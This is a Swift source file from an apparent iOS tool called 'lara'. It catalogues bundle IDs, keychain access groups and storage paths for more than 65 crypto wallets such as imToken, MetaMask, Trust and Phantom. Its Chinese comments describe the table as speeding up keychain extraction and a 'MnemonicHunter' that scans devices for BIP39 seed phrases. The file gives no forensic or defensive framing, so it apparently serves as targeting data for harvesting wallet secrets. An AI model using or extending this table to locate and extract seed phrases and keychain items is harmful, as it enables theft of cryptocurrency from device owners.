//
//  WalletDB.swift
//  lara
//
//  钱包知识库 —— 主流钱包的 bundle id / keychain 组 / 存储路径
//
//  覆盖：国内 + 国际，共 65+ 个
//
//  用途：
//    · 快速定位（已知钱包优先扫，省时间）
//    · keychain agrp 过滤（genp 提取时优先看这些组）
//    · 路径提示（先看这些文件，命中率最高）
//
//  注意：这只是一个「加速表」。真正的覆盖面靠 MnemonicHunter 的
//        内容识别 —— 即使钱包不在这张表里，只要盘上/库里有 BIP39
//        助记词，也能被扫出来。
//

import Foundation

struct WalletInfo {
    let name: String
    /// bundle id 片段（小写，用于 contains 匹配，不要带团队前缀）
    let bundles: [String]
    /// keychain access group 片段
    let agrp: [String]
    /// 相对容器根的路径
    let paths: [String]
}

enum WalletDB {

    // MARK: - 国内

    static let cn: [WalletInfo] = [
        WalletInfo(name: "imToken",
                   bundles: ["im.token.app", "tokencore", "imtoken"],
                   agrp: ["im.token.app", "group.im.token"],
                   paths: ["Documents/walletsV2",
                           "Documents/persistStore/persist-AccountsController",
                           "Documents/persistStore/persist-KeyringController",
                           "Library/Application Support/im.token.app",
                           "Library/Preferences/group.im.token.app.plist"]),

        WalletInfo(name: "TronLink",
                   bundles: ["com.tronlink.hdwallet", "com.tronlink.wallet", "tronlink"],
                   agrp: ["com.tronlink", "group.com.tronlink"],
                   paths: ["Documents/TronLinkData.sqlite",
                           "Documents/TronLinkData.sqlite-wal",
                           "Library/Preferences/group.com.tronlink.walletconnect.plist",
                           "Documents"]),

        WalletInfo(name: "TokenPocket",
                   bundles: ["com.tokenpocket.ios", "pro.tokenpocket.tp", "vip.mytokenpocket",
                             "tokenpocket"],
                   agrp: ["com.tokenpocket", "group.com.tokenpocket"],
                   paths: ["Documents/db/main.sqlite3",
                           "Documents/db/main.sqlite3-wal",
                           "Documents/keystore"]),

        WalletInfo(name: "Bitpie",
                   bundles: ["com.bitpie.wallet", "bitpie"],
                   agrp: ["com.bitpie"],
                   paths: ["Documents/wallet",
                           "Library/Preferences/com.bitpie.wallet.plist"]),

        WalletInfo(name: "Bitget",       // 原 BitKeep
                   bundles: ["com.bitkeep.wallet", "com.bitkeep.os", "com.bitget.wallet", "bitkeep"],
                   agrp: ["com.bitkeep", "group.com.bitkeep"],
                   paths: ["Documents/bitkeep.db",
                           "Documents/bitkeep.db-wal",
                           "Library/Preferences/com.bitkeep.plist"]),

        WalletInfo(name: "MathWallet",
                   bundles: ["com.mathwallet.ios", "com.mathwallet", "mathwallet"],
                   agrp: ["com.mathwallet"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "SafePal",
                   bundles: ["io.safepal.wallet", "com.safepal", "safepal"],
                   agrp: ["io.safepal", "group.io.safepal"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "OneKey",
                   bundles: ["so.onekey.wallet", "com.onekey.wallet", "onekey"],
                   agrp: ["so.onekey", "group.so.onekey"],
                   paths: ["Documents", "Library/Application Support",
                           "Library/Preferences"]),

        WalletInfo(name: "OKX",
                   bundles: ["com.okx.app", "com.okex.wallet", "org.okx.ios",
                             "com.okcoin.app", "com.okx.wallet"],
                   agrp: ["com.okx", "com.okex", "group.com.okex"],
                   paths: ["Documents/keystore", "Documents/wallet", "Documents"]),

        WalletInfo(name: "Binance",
                   bundles: ["com.binance.dev", "com.binance.BNBChainWallet",
                             "com.binance.wallet", "binance"],
                   agrp: ["com.binance", "group.com.binance"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "HTX",          // 原火币
                   bundles: ["com.huobi.wallet", "com.htx.wallet", "com.huobi.app"],
                   agrp: ["com.huobi", "com.htx", "group.com.huobi"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Bixin",
                   bundles: ["im.bixin.wallet", "com.bixin.wallet", "bixin"],
                   agrp: ["im.bixin", "com.bixin"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Coin98",
                   bundles: ["com.coin98.app", "coin98.crypto.finance.insights", "coin98"],
                   agrp: ["com.coin98", "group.com.coin98"],
                   paths: ["Library/Application Support/coin98.crypto.finance.insights",
                           "Documents/db"]),

        WalletInfo(name: "ONTO",
                   bundles: ["com.onto.app", "com.ontio.wallet", "onto"],
                   agrp: ["com.onto", "group.com.onto"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "HyperPay",
                   bundles: ["com.hyperpay.app", "com.hyperpay.wallet", "hyperpay"],
                   agrp: ["com.hyperpay"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "MyKey",
                   bundles: ["com.mykey.wallet", "com.mykey.app", "mykey"],
                   agrp: ["com.mykey"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "AToken",
                   bundles: ["com.atoken.wallet", "com.atoken.app", "atoken"],
                   agrp: ["com.atoken"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "imKey",
                   bundles: ["com.imkey.wallet", "com.imkey.app", "imkey"],
                   agrp: ["com.imkey"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "GlobalWallet",
                   bundles: ["com.global.wallet.ios", "com.global.wallet", "globalwallet"],
                   agrp: ["com.global.wallet"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Tonkeeper",
                   bundles: ["com.jbig.tonkeeper", "tonkeeper"],
                   agrp: ["com.jbig.tonkeeper", "group.com.jbig.tonkeeper"],
                   paths: ["Library/Caches/com.jbig.tonkeeper/Cache.db",
                           "Library/Caches/com.jbig.tonkeeper/Cache.db-wal"]),

        WalletInfo(name: "Tonhub",
                   bundles: ["com.tonhub.app", "tonhub"],
                   agrp: ["com.tonhub", "group.com.tonhub"],
                   paths: ["Library/Preferences/group.cloud.Mindbox.com.tonhub.app.plist",
                           "Library/Preferences"]),

        WalletInfo(name: "Tokenlon",
                   bundles: ["com.tokenlon", "io.tokenlon", "tokenlon"],
                   agrp: ["com.tokenlon", "io.tokenlon"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Tokenary",
                   bundles: ["com.tokenary.wallet", "io.tokenary", "tokenary"],
                   agrp: ["com.tokenary", "io.tokenary"],
                   paths: ["Documents", "Library/Preferences"]),
    ]

    // MARK: - 国际

    static let intl: [WalletInfo] = [
        WalletInfo(name: "MetaMask",
                   bundles: ["io.metamask.metamask", "io.metamask", "metamask"],
                   agrp: ["io.metamask", "group.io.metamask"],
                   paths: ["Documents/keystore",
                           "Documents/temp-cloud-keystore",
                           "Documents/persistStore",
                           "Library/Preferences"]),

        WalletInfo(name: "Trust",
                   bundles: ["com.sixdays.trust", "com.trustwallet", "trustwallet"],
                   agrp: ["com.sixdays.trust", "group.com.sixdays.trust"],
                   paths: ["Library/Preferences/com.sixdays.trust.plist",
                           "Library/Preferences/group.com.sixdays.trust.plist",
                           "Documents"]),

        WalletInfo(name: "Coinbase",
                   bundles: ["org.toshi", "com.coinbase.wallet", "coinbase"],
                   agrp: ["org.toshi", "com.coinbase"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Exodus",
                   bundles: ["com.exodus.wallet", "exodus-movement", "exodus"],
                   agrp: ["com.exodus", "exodus"],
                   paths: ["Documents", "Library/Application Support",
                           "Library/Preferences"]),

        WalletInfo(name: "Atomic",
                   bundles: ["io.atomicwallet", "com.atomicwallet", "atomicwallet"],
                   agrp: ["io.atomicwallet"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Guarda",
                   bundles: ["com.guarda.ios", "com.guarda", "guarda"],
                   agrp: ["com.guarda"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Blockchain.com",
                   bundles: ["com.blockchain.ios.wallet", "com.blockchain.wallet"],
                   agrp: ["com.blockchain"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Keplr",
                   bundles: ["com.chainapsis.keplr", "keplr"],
                   agrp: ["com.chainapsis.keplr", "group.com.chainapsis"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Phantom",
                   bundles: ["app.phantom", "com.phantom.app", "phantom"],
                   agrp: ["app.phantom", "group.app.phantom"],
                   paths: ["Library/Caches/app.phantom", "Documents",
                           "Library/Preferences"]),

        WalletInfo(name: "Solflare",
                   bundles: ["com.solflare.mobile", "com.solflare", "solflare"],
                   agrp: ["com.solflare"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Rabby",
                   bundles: ["com.debank.rabby", "io.rabby", "rabby"],
                   agrp: ["com.debank", "io.rabby"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Rainbow",
                   bundles: ["me.rainbow", "com.rainbow.wallet", "rainbow"],
                   agrp: ["me.rainbow"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Zerion",
                   bundles: ["io.zerion.ios", "io.zerion", "zerion"],
                   agrp: ["io.zerion"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Uniswap",
                   bundles: ["com.uniswap.mobile", "org.uniswap.ios", "uniswap"],
                   agrp: ["com.uniswap", "org.uniswap"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Ledger Live",
                   bundles: ["com.ledger.live", "com.ledger.live.ios", "ledger"],
                   agrp: ["com.ledger"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Argent",
                   bundles: ["com.argent.wallet", "im.argent", "argent"],
                   agrp: ["com.argent", "im.argent"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Backpack",
                   bundles: ["app.backpack.mobile", "app.backpack", "backpack"],
                   agrp: ["app.backpack"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Cosmostation",
                   bundles: ["io.cosmostation.ios", "wannabit.cosmostation", "cosmostation"],
                   agrp: ["io.cosmostation", "wannabit.cosmostation"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Terra Station",
                   bundles: ["io.terra.ios", "io.terra.station", "terra"],
                   agrp: ["io.terra"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Petra",
                   bundles: ["com.petra.wallet", "com.aptos.petra", "petra"],
                   agrp: ["com.petra", "com.aptos"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Martian",
                   bundles: ["com.martian.wallet", "com.martian", "martian"],
                   agrp: ["com.martian"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Sui Wallet",
                   bundles: ["com.mystenlabs.suiwallet", "com.sui.wallet", "suiwallet"],
                   agrp: ["com.mystenlabs", "com.sui"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "NEAR",
                   bundles: ["com.near.wallet", "com.nearprotocol.wallet", "near"],
                   agrp: ["com.near", "com.nearprotocol"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "XDEFI",
                   bundles: ["com.xdefi.wallet", "com.xdefi", "xdefi"],
                   agrp: ["com.xdefi"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Blocto",
                   bundles: ["com.blocto.app", "com.portto.blocto", "blocto"],
                   agrp: ["com.blocto", "com.portto"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Nightly",
                   bundles: ["com.nightly.wallet", "com.nightly", "nightly"],
                   agrp: ["com.nightly"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Leap",
                   bundles: ["io.leapwallet", "com.leap.wallet", "leap"],
                   agrp: ["io.leapwallet"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Dapper",
                   bundles: ["com.dapper.wallet", "com.dapper", "dapper"],
                   agrp: ["com.dapper"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Crypto.com",
                   bundles: ["co.mona.mona", "com.crypto.wallet", "crypto.com"],
                   agrp: ["co.mona", "com.crypto"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Brave",
                   bundles: ["com.brave.ios.browser", "com.brave.browser", "brave"],
                   agrp: ["com.brave"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Status",
                   bundles: ["im.status.ethereum", "im.status", "status"],
                   agrp: ["im.status"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Edge",
                   bundles: ["co.edgesecure.app", "com.edgesecure", "edge"],
                   agrp: ["co.edgesecure"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "BlueWallet",
                   bundles: ["io.bluewallet.bluewallet", "bluewallet"],
                   agrp: ["io.bluewallet"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Muun",
                   bundles: ["io.muun.apollo", "com.muun", "muun"],
                   agrp: ["io.muun"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Phoenix",
                   bundles: ["co.acinq.phoenix", "phoenix"],
                   agrp: ["co.acinq"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Bread",
                   bundles: ["com.breadwallet", "breadwallet"],
                   agrp: ["com.breadwallet"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Electrum",
                   bundles: ["org.electrum.electrum", "electrum"],
                   agrp: ["org.electrum"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Abra",
                   bundles: ["com.plutus.wallet", "com.abra.ios", "abra"],
                   agrp: ["com.plutus", "com.abra"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Nexo",
                   bundles: ["com.nexo.mobile", "com.nexo", "nexo"],
                   agrp: ["com.nexo"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Kraken",
                   bundles: ["com.kraken.invest.app", "com.kraken", "kraken"],
                   agrp: ["com.kraken"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Bybit",
                   bundles: ["com.bybit.app", "com.bybit", "bybit"],
                   agrp: ["com.bybit"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "KuCoin",
                   bundles: ["com.kucoin.kucoin", "com.kucoin", "kucoin"],
                   agrp: ["com.kucoin"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Gate.io",
                   bundles: ["com.gateio.gateio", "com.gateio", "gateio"],
                   agrp: ["com.gateio"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "MEXC",
                   bundles: ["com.mexc.app", "com.mexcpro", "mexc"],
                   agrp: ["com.mexc"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Coinomi",
                   bundles: ["com.coinomi.wallet", "com.coinomi", "coinomi"],
                   agrp: ["com.coinomi"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Jaxx Liberty",
                   bundles: ["com.liberty.jaxx", "com.jaxx", "jaxx"],
                   agrp: ["com.liberty", "com.jaxx"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Mycelium",
                   bundles: ["com.mycelium.wallet", "com.mycelium", "mycelium"],
                   agrp: ["com.mycelium"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Luno",
                   bundles: ["com.luno.wallet", "com.luno", "luno"],
                   agrp: ["com.luno"],
                   paths: ["Documents", "Library/Preferences"]),

        WalletInfo(name: "Slash",
                   bundles: ["com.slash.wallet", "com.slash", "slash"],
                   agrp: ["com.slash"],
                   paths: ["Documents", "Library/Preferences"]),
    ]

    // MARK: - 汇总

    static var all: [WalletInfo] { cn + intl }

    /// 全部 bundle id 片段（小写）
    static var allBundleFragments: [String] {
        Array(Set(all.flatMap { $0.bundles.map { $0.lowercased() } })).sorted()
    }

    /// 全部 keychain 组片段
    static var allAgrpFragments: [String] {
        Array(Set(all.flatMap { $0.agrp.map { $0.lowercased() } })).sorted()
    }

    /// 按 bundle id 找钱包
    static func match(bundleId: String) -> WalletInfo? {
        let b = bundleId.lowercased()
        for w in all {
            for f in w.bundles where b.contains(f) {
                return w
            }
        }
        return nil
    }

    static var count: Int { all.count }
}
